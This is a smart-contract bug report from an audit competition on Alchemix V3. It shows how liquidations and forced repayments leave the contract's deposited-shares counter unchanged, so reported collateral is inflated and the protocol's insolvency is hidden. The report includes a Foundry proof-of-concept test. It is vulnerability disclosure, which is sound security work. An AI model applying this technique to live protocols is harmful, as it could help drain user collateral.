# 57632 sc high inflated tvl in mytsharesdeposited hides protocol insolvency

**Submitted on Oct 27th 2025 at 18:55:15 UTC by @niffylord for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57632
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Protocol insolvency

## Description

### Brief / Intro

Whenever `_forceRepay` or `_doLiquidation` sends MYT out of the Alchemist, `_mytSharesDeposited` is left unchanged. `getTotalUnderlyingValue()` therefore reports collateral that no longer exists, keeping the transmuter bad-debt ratio artificially low. Attackers (or normal users) can continue redeeming and minting against phantom collateral until the protocol runs out of backing, leading to protocol insolvency.

### Vulnerability Details

* `_forceRepay` (`src/AlchemistV3.sol:750-789`) and `_doLiquidation` (`src/AlchemistV3.sol:867-889`) transfer MYT to the transmuter/liquidator but never decrement `_mytSharesDeposited`.
* `getTotalUnderlyingValue()` (`src/AlchemistV3.sol:1239-1241`) converts `_mytSharesDeposited` to underlying to produce TVL. After the transfer, this value still includes the shares that were sent out.
* `Transmuter.getBadDebtRatio()` (`src/Transmuter.sol:215-226`) divides total synthetics by that TVL. With the denominator inflated, the ratio remains below 1 even when collateral has already left the system, so redemptions are not scaled and fresh debt can still be minted.
* Repeated forced repayments or liquidations drain actual MYT while accounting remains unchanged, eventually leaving outstanding alAssets without backing.

### Impact Details

Impact: **Protocol insolvency**

* TVL is overstated by the amount of MYT removed via `_forceRepay` and `_doLiquidation`.
* Users continue to redeem at face value because the bad-debt ratio understates insolvency; transmuter releases MYT that no longer exists.
* The discrepancy can grow to the entire protocol collateral, leaving alAssets unbacked and the protocol insolvent.

### References

* `src/AlchemistV3.sol` lines 750-789, 867-889, 1239-1241
* `src/Transmuter.sol` lines 215-226
* PoC: `src/test/poc/MytSharesDepositedPoC.t.sol`

## Proof of Concept

1. Ensure dependencies are installed (per project README) and Foundry is available.
2. Run the dedicated test:

   ```bash
   forge test --match-test test_poc_mytSharesDeposited_skew -vv
   ```
3. Test flow (implemented in `src/test/poc/MytSharesDepositedPoC.t.sol`):
   * Create a borrower, deposit MYT, mint the maximum allowable alTokens.
   * Pump the mock strategy’s share price to mimic accrued yield.
   * Trigger liquidation from another user; MYT leaves the Alchemist via `_doLiquidation`.
   * Compare `getTotalUnderlyingValue()` (uses `_mytSharesDeposited`) with the actual MYT balance still held by the Alchemist.
4. Logs show `Tracked underlying (post)` unchanged while `Actual underlying (post)` drops to zero. The test asserts the discrepancy, proving `_mytSharesDeposited` never accounted for the transfer and the protocol now believes it holds collateral that is gone.

### PoC Source

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {AlchemistV3Test} from "../AlchemistV3.t.sol";
import {IMockYieldToken} from "../mocks/MockYieldToken.sol";
import {AlchemistNFTHelper} from "../libraries/AlchemistNFTHelper.sol";
import {SafeERC20} from "../../libraries/SafeERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MytSharesDepositedPoC is AlchemistV3Test {
    using SafeERC20 for IERC20;

    function test_poc_mytSharesDeposited_skew() external {
        address borrower = address(0xbeef);

        vm.startPrank(borrower);
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount);
        alchemist.deposit(depositAmount, borrower, 0);
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(borrower, address(alchemistNFT));
        uint256 maxBorrow = alchemist.getMaxBorrowable(tokenId);
        alchemist.mint(tokenId, maxBorrow, borrower);
        vm.stopPrank();

        uint256 initialSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialSupply * 25);

        uint256 preUnderlyingTracked = alchemist.getTotalUnderlyingValue();
        uint256 preActualUnderlying =
            alchemist.convertYieldTokensToUnderlying(IERC20(address(vault)).balanceOf(address(alchemist)));

        vm.startPrank(externalUser);
        (uint256 totalSeized,,) = alchemist.liquidate(tokenId);
        vm.stopPrank();
        assertGt(totalSeized, 0, "liquidation should seize collateral");

        uint256 postUnderlyingTracked = alchemist.getTotalUnderlyingValue();
        uint256 postActualUnderlying =
            alchemist.convertYieldTokensToUnderlying(IERC20(address(vault)).balanceOf(address(alchemist)));

        emit log_named_uint("Tracked underlying (pre)", preUnderlyingTracked);
        emit log_named_uint("Tracked underlying (post)", postUnderlyingTracked);
        emit log_named_uint("Actual underlying (post)", postActualUnderlying);

        assertGt(postUnderlyingTracked, postActualUnderlying, "TVL should be overstated after liquidation");
        assertEq(postUnderlyingTracked, preUnderlyingTracked, "Tracked TVL unexpectedly changed");
        assertLt(postActualUnderlying, preActualUnderlying, "Actual holdings should fall after liquidation");
    }
}
```
